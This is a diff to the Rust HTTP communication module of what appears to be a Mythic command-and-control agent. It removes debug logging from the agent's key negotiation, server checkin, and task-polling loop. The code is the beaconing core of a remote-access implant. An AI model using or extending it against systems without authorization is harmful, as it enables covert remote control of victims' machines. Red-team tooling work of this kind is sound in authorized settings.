@@ -190,8 +190,7 @@ impl HttpProfile {
         let cleaned: String = response_text.chars().filter(|c| !c.is_whitespace()).collect();
         let raw = match BASE64.decode(&cleaned) {
             Ok(d) => d,
-            Err(e) => {
-                eprintln!("[agent] decode_response: base64 decode error: {} (first 100 chars: {:?})", e, &cleaned[..std::cmp::min(cleaned.len(), 100)]);
+            Err(_) => {
                 return None;
             }
         };
@@ -233,7 +232,6 @@ impl HttpProfile {
         let url = self.get_post_url();
         let headers = self.build_headers();
         let encoded = self.encode_message(data);
-        eprintln!("[agent] send_message: POST {} ({}B encoded)", url, encoded.len());
 
         for attempt in 0..MAX_RETRY_COUNT {
             match client
@@ -244,23 +242,17 @@ impl HttpProfile {
                 .await
             {
                 Ok(resp) => {
-                    let status = resp.status();
-                    eprintln!("[agent] send_message: HTTP {}", status);
                     match resp.text().await {
-                    Ok(text) => {
-                        eprintln!("[agent] send_message: response body ({}B): {:?}", text.len(), &text[..std::cmp::min(text.len(), 200)]);
-                        if let Some(decoded) = self.decode_response(&text) {
-                            return Some(decoded);
+                        Ok(text) => {
+                            if let Some(decoded) = self.decode_response(&text) {
+                                return Some(decoded);
+                            }
+                            return None;
                         }
-                        eprintln!("[agent] send_message: decode_response returned None");
-                        return None;
+                        Err(_e) => {}
                     }
-                    Err(e) => {
-                        eprintln!("[agent] send_message: response read error (attempt {}): {}", attempt, e);
-                    }
-                }},
-                Err(e) => {
-                    eprintln!("[agent] send_message: HTTP send error (attempt {}): {}", attempt, e);
+                }
+                Err(_e) => {
                     profiles::increment_failed_connection("http");
                 }
             }
@@ -365,37 +357,26 @@ impl Profile for HttpProfile {
     }
 
     async fn start(&self) {
-        eprintln!("[agent] HTTP start() entered");
         self.running.store(true, Ordering::Relaxed);
         self.should_stop.store(false, Ordering::Relaxed);
 
         // Negotiate key if needed
-        eprintln!("[agent] HTTP: calling negotiate_key()");
         if !self.negotiate_key().await {
-            eprintln!("[agent] HTTP: negotiate_key() FAILED, returning");
             self.running.store(false, Ordering::Relaxed);
             return;
         }
-        eprintln!("[agent] HTTP: negotiate_key() OK");
 
         // Checkin
-        eprintln!("[agent] HTTP: calling checkin()");
         let checkin_response = match self.checkin().await {
-            Some(r) => {
-                eprintln!("[agent] HTTP: checkin() returned response");
-                r
-            }
+            Some(r) => r,
             None => {
-                eprintln!("[agent] HTTP: checkin() returned None, returning");
                 self.running.store(false, Ordering::Relaxed);
                 return;
             }
         };
 
         if let Some(status) = &checkin_response.status {
-            eprintln!("[agent] HTTP: checkin status = {:?}", status);
             if status != "success" {
-                eprintln!("[agent] HTTP: checkin status not success, returning");
                 self.running.store(false, Ordering::Relaxed);
                 return;
             }
@@ -418,20 +399,10 @@ impl Profile for HttpProfile {
             }
         }
 
-        let poll_uuid = self.uuid.read().unwrap().clone();
-        let killdate_val = *self.killdate.read().unwrap();
-        let interval_val = self.interval.load(Ordering::Relaxed);
-        eprintln!("[agent] Checkin OK, UUID={}, killdate={}, interval={}s", poll_uuid, killdate_val, interval_val);
-
         // Main polling loop
-        let should_stop = self.should_stop.load(Ordering::Relaxed);
-        let past_kill = self.past_killdate();
-        eprintln!("[agent] Loop check: should_stop={}, past_killdate={}", should_stop, past_kill);
-
         while !self.should_stop.load(Ordering::Relaxed) && !self.past_killdate() {
             // Sleep
             let sleep_time = self.get_sleep_time();
-            eprintln!("[agent] Sleeping {}s", sleep_time);
             if sleep_time > 0 {
                 tokio::time::sleep(Duration::from_secs(sleep_time as u64)).await;
             }
@@ -444,37 +415,21 @@ impl Profile for HttpProfile {
             let msg = crate::responses::drain_poll_buffer();
             let msg_json = match serde_json::to_vec(&msg) {
                 Ok(j) => j,
-                Err(e) => {
-                    eprintln!("[agent] Failed to serialize poll msg: {}", e);
+                Err(_) => {
                     continue;
                 }
             };
-            eprintln!("[agent] Sending poll...");
             // Send and process response
             if let Some(response_bytes) = self.send_message(&msg_json).await {
-                let preview = String::from_utf8_lossy(
-                    &response_bytes[..std::cmp::min(response_bytes.len(), 300)]
-                );
-                eprintln!("[agent] Poll response ({}B): {}", response_bytes.len(), preview);
                 match serde_json::from_slice::<crate::structs::MythicMessageResponse>(&response_bytes)
                 {
                     Ok(mythic_response) => {
-                        if !mythic_response.tasks.is_empty() {
-                            eprintln!("[agent] Got {} tasks", mythic_response.tasks.len());
-                        }
                         tasks::handle_message_from_mythic(mythic_response).await;
                     }
-                    Err(e) => {
-                        eprintln!("[agent] Failed to parse poll response: {}", e);
-                    }
+                    Err(_) => {}
                 }
-            } else {
-                eprintln!("[agent] Poll: send_message returned None");
             }
         }
-
-        eprintln!("[agent] Poll loop exited: should_stop={}, past_killdate={}",
-            self.should_stop.load(Ordering::Relaxed), self.past_killdate());
 
         self.running.store(false, Ordering::Relaxed);
         utils::print_debug("HTTP: Profile stopped");
